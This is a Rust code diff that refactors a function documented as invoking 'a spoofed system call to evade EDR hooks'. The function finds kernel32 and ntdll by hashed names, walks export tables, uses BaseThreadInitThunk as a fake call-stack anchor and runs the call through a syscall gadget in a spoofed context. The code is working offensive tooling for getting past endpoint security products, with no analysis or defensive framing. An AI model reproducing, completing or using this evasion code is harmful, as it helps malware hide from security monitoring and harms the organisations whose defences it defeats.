@@ -25,7 +25,14 @@ pub enum SpoofError {
 }
 
 pub type SpoofResult<T> = Result<T, SpoofError>;
-
+/// Invokes a spoofed system call to evade EDR hooks.
+///
+/// # Safety
+///
+/// This function is unsafe because it manually walks the Export Address Table (EAT),
+/// performs pointer arithmetic, and manipulates the execution context/stack.
+/// The caller must ensure that `arg1` points to a valid memory location and that
+/// the target NT function hashes are correct.
 pub unsafe fn invoke_spoofed_syscall(
     nt_function_hash: u32,
     arg1: *mut c_void,
@@ -35,30 +42,32 @@ pub unsafe fn invoke_spoofed_syscall(
     const KERNEL32_HASH: u32 = eat_walker::hash_djb2_custom(b"kernel32.dll");
     const FAKE_ANCHOR_HASH: u32 = eat_walker::hash_djb2_custom(b"basethreadinitthunk");
 
-    let mut kernel32_base = get_module_base_by_hash(KERNEL32_HASH);
+    let kernel32_base = unsafe { get_module_base_by_hash(KERNEL32_HASH) };
 
     if kernel32_base.is_null() {
         return Err(SpoofError::Kernel32NotFound);
     }
 
-    let fake_anchor = get_proc_address_by_hash(kernel32_base as *const u8, FAKE_ANCHOR_HASH);
+    let fake_anchor =
+        unsafe { get_proc_address_by_hash(kernel32_base as *const u8, FAKE_ANCHOR_HASH) };
 
     if fake_anchor.is_null() {
         return Err(SpoofError::BaseThreadInitThunkNotFound);
     }
 
-    let mut ntdll_base = get_module_base_by_hash(0x1e81e3a9);
+    let mut ntdll_base = unsafe { get_module_base_by_hash(0x1e81e3a9) };
 
     if ntdll_base.is_null() {
         let hash_ntdll_lowercase = eat_walker::hash_djb2_custom(b"ntdll.dll");
-        ntdll_base = get_module_base_by_hash(hash_ntdll_lowercase);
+        ntdll_base = unsafe { get_module_base_by_hash(hash_ntdll_lowercase) };
     }
 
     if ntdll_base.is_null() {
         return Err(SpoofError::NtdllNotFound);
     }
 
-    let nt_target_function = get_proc_address_by_hash(ntdll_base as *const u8, nt_function_hash);
+    let nt_target_function =
+        unsafe { get_proc_address_by_hash(ntdll_base as *const u8, nt_function_hash) };
     if nt_target_function.is_null() {
         return Err(SpoofError::TargetFunctionNotFound);
     }
@@ -72,7 +81,7 @@ pub unsafe fn invoke_spoofed_syscall(
         end: text_end as *const u8,
     };
 
-    let syscall_info = match unsafe { resolve(nt_target_function as *const c_void, &bounds) } {
+    let syscall_info = match unsafe { resolve(nt_target_function, &bounds) } {
         Some(info) => info,
         None => {
             return Err(SpoofError::SyscallResolutionFailed);
@@ -86,7 +95,7 @@ pub unsafe fn invoke_spoofed_syscall(
         syscall_gadget: syscall_info.gadget as *const c_void,
     };
 
-    let status = execute_spoofed_context(&mut context, arg1, arg2, arg3);
+    let status = unsafe { execute_spoofed_context(&mut context, arg1, arg2, arg3) };
     Ok(status)
 }
 
